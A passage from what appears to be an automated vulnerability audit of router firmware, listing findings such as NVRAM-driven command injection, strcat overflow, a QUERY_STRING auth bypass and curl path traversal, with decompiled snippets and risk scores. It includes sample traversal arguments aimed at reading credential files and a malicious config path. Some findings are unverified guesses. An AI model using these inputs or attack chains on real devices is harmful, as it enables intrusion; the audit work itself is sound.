- **Description:** Environment variable path concatenation vulnerability: In function fcn.REDACTED_PASSWORD_PLACEHOLDER, the environment variable value (iVar9) is directly used for strcat path concatenation (target buffer acStack_254[256]). Trigger conditions: 1) Attacker controls environment variable value 2) Value length exceeds remaining buffer space. Boundary check: No length validation mechanism. Exploitability: Buffer overflow can be triggered by crafting an excessively long environment variable value, potentially overwriting return addresses or function pointers.
- **Code Snippet:**
  ```
  strcat(puVar8,iVar9);
  iVar1 = sym.imp.fopen(puVar8,*0x17968);
  ```
- **Keywords:** strcat, acStack_254, iVar9, fopen, getenv
- **Notes:** Verification required: 1) Initial content of puVar8 2) Maximum overflowable length 3) Status of stack protection mechanism. Potential combined vulnerability with NVRAM contamination chain.

---
### cmd_injection-nvram_loop_exec-fcn1728c

- **File/Directory Path:** `sbin/system`
- **Location:** `fcn.0001728c+0x16ac0`
- **Risk Score:** 8.0
- **Confidence:** 6.75
- **Description:** NVRAM Loop Command Execution Risk: At fcn.0001728c+0x16ac0, NVRAM values are split by getTokens and then used to loop-execute system commands. Trigger Condition: NVRAM values contain command separators such as semicolons. Boundary Check: No filtering for dangerous characters. Exploitability: Single contamination triggers execution of multiple commands, amplifying attack impact.
- **Code Snippet:**
  ```
  uVar13 = sym.imp.acosNvramConfig_get(...);
  iVar18 = sym.imp.getTokens(uVar13,...);
  do {
    sym.imp.system(iVar3);
  } while(...);
  ```
- **Keywords:** acosNvramConfig_get, getTokens, system
- **Notes:** nvram_get

---
### configuration_load-dbus_privileged_servicehelper

- **File/Directory Path:** `etc/system.conf`
- **Location:** `etc/system.conf`
- **Risk Score:** 8.0
- **Confidence:** 6.25
- **Description:** Privileged service launcher path configuration: servicehelper points to the high-privilege binary /usr/libexec/dbus-daemon-launch-helper. This component runs with REDACTED_PASSWORD_PLACEHOLDER privileges. If vulnerabilities (such as buffer overflow) exist, they could form a complete attack chain when combined with the D-Bus message passing mechanism. Trigger conditions: 1) The binary contains memory corruption vulnerabilities 2) Attackers can craft malicious D-Bus messages. Impact includes direct REDACTED_PASSWORD_PLACEHOLDER privilege escalation, as this helper is responsible for launching system-level services.
- **Code Snippet:**
  ```
  <servicehelper>/usr/libexec/dbus-daemon-launch-helper</servicehelper>
  ```
- **Keywords:** servicehelper>/usr/libexec/dbus-daemon-launch-helper, auth>EXTERNAL, listen>unix:REDACTED_PASSWORD_PLACEHOLDER_bus_socket
- **Notes:** Binary analysis is required for /usr/libexec/dbus-daemon-launch-helper. The attack surface includes: triggering vulnerabilities by passing malicious data through local inter-process communication (IPC).

---
### potential_chain-http_to_popen-QUERY_STRING_param1

- **File/Directory Path:** `www/cgi-bin/genie.cgi`
- **Location:** `HIDDEN：www/cgi-bin/genie.cgi (QUERY_GETHIDDEN) → HIDDEN (HIDDEN)`
- **Risk Score:** 8.0
- **Confidence:** 3.5
- **Description:** Attack chain constructed based on association analysis: 1) Input source: QUERY_STRING parameter in HTTP requests (refer to genie.cgi discovery) 2) Propagation path: transmitted via param_1 variable 3) Hazardous operations: popen command execution + nvram_get configuration retrieval + strncpy boundary absence. Trigger condition: attacker manipulates QUERY_STRING to inject commands or oversized data. Actual impact: command injection leading to RCE or buffer overflow. Limitation: complete control flow unverified due to missing symbols, requiring dynamic testing for confirmation.
- **Keywords:** QUERY_STRING, param_1, popen, nvram_get, strncpy, genie.cgi
- **Notes:** Correlation basis: 1) genie.cgi discovery proves QUERY_STRING is controllable and correlates with param_1. 2) New analysis confirms param_1 flows into dangerous functions. To be verified: Specific data flow from param_1 to popen/nvram_get. Additional recommendation: Prioritize dynamic tracing of param_1's transmission path in genie.cgi.

---
### network_input-QUERY_STRING_auth_bypass-fcn_000093e4

- **File/Directory Path:** `www/cgi-bin/genie.cgi`
- **Location:** `genie.cgi:0x14e (fcn.00009ef8)`
- **Risk Score:** 7.5
- **Confidence:** 8.5
- **Description:** QUERY_STRING unvalidated passing risk: Directly obtaining through getenv("QUERY_STRING") and passing to REDACTED_PASSWORD_PLACEHOLDER verification function (fcn.000093e4). Attackers can manipulate QUERY_STRING values to attempt bypassing access controls. Trigger condition: Sending HTTP requests containing QUERY_STRING parameters. Actual impact: Potential unauthorized access by bypassing security verification mechanisms.
- **Keywords:** QUERY_STRING, getenv, fcn.000093e4, param_1
- **Notes:** Analyze whether there are logical vulnerabilities in the REDACTED_PASSWORD_PLACEHOLDER verification implementation of fcn.000093e4

---
### command_execution-ubdcmd-manualset

- **File/Directory Path:** `sbin/ubdcmd`
- **Location:** `ubdcmd:0x99e4,0x99f0,0x9a04`
- **Risk Score:** 7.5
- **Confidence:** 8.5
- **Description:** manualset command injection chain: Triggers integer overflow and IP validation bypass via command-line arguments. Trigger condition: Execute `ubdcmd manualset <oversized integer> <malformed IP>`. Specific manifestations: 1) argv[2]/argv[3] directly converted via atoi without boundary checks → integer overflow at 0x9a60 in fcn.00008b98 2) argv[4] bypasses REDACTED_SECRET_KEY_PLACEHOLDER validation → silently uses default IP. Security impact: Network configuration logic corruption may lead to access control bypass. Constraint checks: Parameter count validation exists (argc≥5), but no content/boundary verification.
- **Code Snippet:**
  ```
  mov r0, [r4, #8]  ; argv[2]
  bl atoi
  mov r0, [r4, #12] ; argv[3]
  bl atoi
  mov r0, [r4, #16] ; argv[4]
  bl REDACTED_SECRET_KEY_PLACEHOLDER
  ```
- **Keywords:** manualset, argv[2], argv[3], argv[4], atoi, REDACTED_SECRET_KEY_PLACEHOLDER, fcn.00008b98
- **Notes:** It is necessary to verify the call frequency of manualset in conjunction with the web interface; correlate with fcn.00008b98 (recvmsg buffer check).

---
### curl-T-parameter-arbitrary-read

- **File/Directory Path:** `sbin/curl`
- **Location:** `getparameter:0x0000e308, operate_do:0x00011bec`
- **Risk Score:** 7.5
- **Confidence:** 8.0
- **Description:** The -T parameter in curl has an arbitrary file read vulnerability: in the getparameter function (case 0x1e), user-provided file paths are directly passed to open64() without normalization. Attackers can read sensitive files using '-T ../../..REDACTED_PASSWORD_PLACEHOLDER'. Trigger conditions: 1) Attacker controls curl parameters 2) The curl process has read permissions for the target file. In firmware, this may expose REDACTED_PASSWORD_PLACEHOLDER hashes or configuration keys.
- **Code Snippet:**
  ```
  uVar5 = sym.imp.open64(*(puVar22 + -0x10), iVar9 + 0);
  ```
- **Keywords:** getparameter, case 0x1e, open64, operate_do, -T, upload, curl
- **Notes:** The associated function is glob_url; it is recommended to subsequently check the firmware file permission model. Common paths: /usr/bin/curl or /sbin/curl.

---
### cmd_injection-leafp2p_service-fcn1728c

- **File/Directory Path:** `sbin/system`
- **Location:** `fcn.0001728c`
- **Risk Score:** 7.5
- **Confidence:** 8.0
- **Description:** command_execution  

Risk in leafp2p.sh service control: The system file directly executes `sh /etc/init.d/leafp2p.sh start/stop` via the system function. Trigger condition: Network configuration changes (e.g., PPPoE connection). Security impact: 1) If command construction parameters (e.g., pcVar10) are tainted, malicious commands can be injected; 2) Combined with NVRAM taint chain, it enables secondary attacks. Boundary check: No input filtering detected.
- **Code Snippet:**
  ```
  sym.imp.sprintf(iVar18,*0x16eec,pcVar10,uVar13);
  sym.imp.system(iVar18);
  ```
- **Keywords:** system, sprintf, sh /etc/init.d/leafp2p.sh start, leafp2p_run
- **Notes:** Associated file: /etc/init.d/leafp2p.sh (requires analysis for potential command injection risks). Potential contamination sources may originate from environment variables or NVRAM.

---
### configuration_load-readydropd-httpd_admin_privilege

- **File/Directory Path:** `www/cgi-bin/readydropd.conf`
- **Location:** `www/cgi-bin/readydropd.conf`
- **Risk Score:** 7.5
- **Confidence:** 7.5
- **Description:** The httpd_user is configured as a high-privilege REDACTED_PASSWORD_PLACEHOLDER account without defined permission boundaries. If a vulnerability (e.g., buffer overflow) exists in the service, attackers may directly obtain REDACTED_PASSWORD_PLACEHOLDER privileges. Trigger condition: Sending malicious data through network interfaces or IPC to exploit the vulnerability.
- **Code Snippet:**
  ```
  httpd_user = REDACTED_PASSWORD_PLACEHOLDER
  httpd_group = REDACTED_PASSWORD_PLACEHOLDER
  ```
- **Keywords:** httpd_user, REDACTED_PASSWORD_PLACEHOLDER, httpd_group
- **Notes:** It is recommended to verify the actual process permissions (validate through system startup scripts)

---
### configuration_load-dbus_system_policy_include

- **File/Directory Path:** `etc/system.conf`
- **Location:** `etc/system.conf`
- **Risk Score:** 7.5
- **Confidence:** 7.0
- **Description:** The D-Bus system bus configuration file exposure policy includes a mechanism: loading external policy files via the <includedir>system.d</includedir> directive. If an attacker can tamper with policy files in the system.d directory (e.g., through path traversal or weak permissions), they can override default security policies (such as deny own="*"). Successful exploitation requires: 1) improper permission configuration of the system.d directory, and 2) the existence of a file write vulnerability. Impacts include: regular users registering malicious services, sending unauthorized method calls, leading to privilege escalation or system control.
- **Code Snippet:**
  ```
  <includedir>system.d</includedir>
  <policy context="default">
    <deny own="*"/>
    <deny send_type="method_call"/>
  </policy>
  ```
- **Keywords:** includedir>system.d, deny own="*", deny send_type="method_call", policy context="default"
- **Notes:** Verify the permission settings of the system.d directory and the integrity of policy files. Subsequent analysis should include: 1) Permissions of the /etc/dbus-1/system.d directory 2) Content of each service policy file

---
### command_execution-pppd_script_env-injection_risk

- **File/Directory Path:** `sbin/pppd`
- **Location:** `sbin/pppd: script_setenv (HIDDEN)`
- **Risk Score:** 7.5
- **Confidence:** 6.75
- **Description:** Potential risk of environment variable injection: Variables set by script_setenv (such as SPEED) are passed to the /tmp/ppp/ip-up script via /bin/sh. If the variable value is tainted and the script lacks proper filtering, command injection may occur. Trigger condition: The script executes automatically upon PPP connection state changes. Current evidence is insufficient; verification is required for: 1) Whether the SPEED value originates from externally controllable sources 2) Whether the ip-up script contains unsafe variable references.
- **Keywords:** script_setenv, connect_tty, SPEED, device_script, execl, /tmp/ppp/ip-up, CONNECT_TIME
- **Notes:** Follow-up analysis directions: 1) Examine the contents of the /tmp/ppp/ip-up script 2) Dynamically trace the source of the SPEED value 3) Correlate with the 'setenv' keyword in the knowledge base

---
### nvram_get-rc-time_zone_env_hijack

- **File/Directory Path:** `sbin/rc`
- **Location:** `sbin/rc:0x108ac (main)`
- **Risk Score:** 7.0
- **Confidence:** 8.5
- **Description:** NVRAM variable 'time_zone' pollution leads to environment variable hijacking: In the main function at 0x108ac, the return value of nvram_get("time_zone") is directly set as an environment variable via setenv("TZ", value, 1) without filtering. Attackers can manipulate the TZ variable by tampering with NVRAM (e.g., through HTTP interfaces), affecting time-sensitive services. Trigger condition: The rc script automatically executes during system initialization.
- **Keywords:** time_zone, nvram_get, setenv, TZ, main
- **Notes:** Verify the dependency of glibc time functions on TZ; Related knowledge base note: Binary analysis of /usr/libexec/dbus-daemon-launch-helper is required.

---
### nvram_get-ubdcmd-wan_config

- **File/Directory Path:** `sbin/ubdcmd`
- **Location:** `ubdcmd:0x91b4`
- **Risk Score:** 7.0
- **Confidence:** 8.25
- **Description:** NVRAM Variable Handling Vulnerability: Variables (wan_proto/wan_mtu) obtained via acosNvramConfig_get are used directly without validation. Trigger Condition: Executing network configuration-related functions after tampering with NVRAM variables. Specific Manifestations: 1) Direct atoi conversion of strings → Non-numeric input causes logical errors 2) Converted integers used in calculations → Extremely large values trigger integer overflow. Security Impact: Configuration tampering/service crash. Constraint Check: No input filtering or boundary validation.
- **Code Snippet:**
  ```
  bl acosNvramConfig_get(wan_mtu)
  bl atoi  ; HIDDEN
  sub r0, r0, #10 ; HIDDEN
  ```
- **Keywords:** acosNvramConfig_get, wan_proto, wan_mtu, atoi, fcn.000091b4
- **Notes:** Track NVRAM pollution vectors globally; associate with atoi (shared conversion function across multiple chains)

---
### nvram_set-leafp2p-port_config

- **File/Directory Path:** `etc/init.d/remote.sh`
- **Location:** `etc/init.d/remote.sh:21-72`
- **Risk Score:** 7.0
- **Confidence:** 7.75
- **Description:** The leafp2p service configuration (e.g., leafp2p_service_0) is initialized through 9 sets of nvram_set operations. When the NVRAM value is empty, default values containing high-risk ports (135/136/445/548) are set. Trigger condition: Automatically executed upon service startup. Attackers can manipulate service behavior by tampering with NVRAM but must first obtain NVRAM write permissions.
- **Code Snippet:**
  ```
  ${nvram} set leafp2p_service_0="RouterRemote,0,1,1,1,1,6:135,6:136,6:137,6:138,6:139,6:445,17:548"
  ```
- **Keywords:** nvram get, nvram set, nvram commit, leafp2p_service_0, leafp2p_remote_url
- **Notes:** Verify whether the port is actually open. Recommended next steps: 1) Scan service ports 2) Check NVRAM write protection mechanism

---
### curl-config-insecure-load

- **File/Directory Path:** `sbin/curl`
- **Location:** `getparameter:0x0000e308`
- **Risk Score:** 7.0
- **Confidence:** 7.0
- **Description:** The --config parameter in curl has an insecure loading vulnerability: the user-specified configuration file path is directly passed to parseconfig() in the getparameter function (case 0x28), without protection against path traversal attacks (e.g., '--config ../../tmp/evil.conf'). Malicious configurations can alter security settings such as SSL certificate verification. Trigger condition: an attacker can control both the configuration file path and its content.
- **Code Snippet:**
  ```
  iVar5 = sym.parseconfig(param_2, param_4);
  ```
- **Keywords:** getparameter, case 0x28, parseconfig, --config, curl
- **Notes:** Conduct an in-depth analysis of the parseconfig function; relate to high-risk operation: CURLOPT_SSL_VERIFYPEER. Common paths: /usr/bin/curl or /sbin/curl.

---
